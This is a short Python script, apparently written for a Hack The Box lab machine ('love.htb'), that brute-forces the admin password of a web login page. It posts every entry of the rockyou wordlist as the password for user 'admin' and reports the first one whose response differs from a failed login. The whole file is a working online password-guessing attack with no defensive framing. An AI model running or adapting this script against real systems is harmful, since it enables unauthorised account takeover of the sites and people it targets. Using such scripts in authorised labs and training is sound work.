import requests as req

HOST = "love.htb"
PORT = "80"
PATH = "http://%s:%s/admin/index.php" % (HOST, PORT)
wordlist = open("/usr/share/wordlists/rockyou.txt", "rb").read().split(b"\n")

def brute_pass(url):
    rexamp = req.post(url, data={"username": "admin", "password": "admin"})
    i = 1
    for passwd in wordlist:
        #vote_id = "0" * (len("1000000")-len(str(i))) + str(i)
        try:
            passwd = passwd.decode("utf-8")
            r = req.post(url, data={"username": "admin", "password": passwd})
            if r.text == rexamp.text:
                print("\r[%i/%i] Incorrect passwd: %s" % (i, len(wordlist), passwd), end="")
                i += 1
            else:
                print("-" * 60)
                print("PASSWORD IS : %s" % passwd)
                break

        except KeyboardInterrupt:
            print("BREAK")
            exit(1)
            
        except:
            pass

def brute_user(url):
    pass

if __name__ == "__main__":
    brute_pass(PATH)
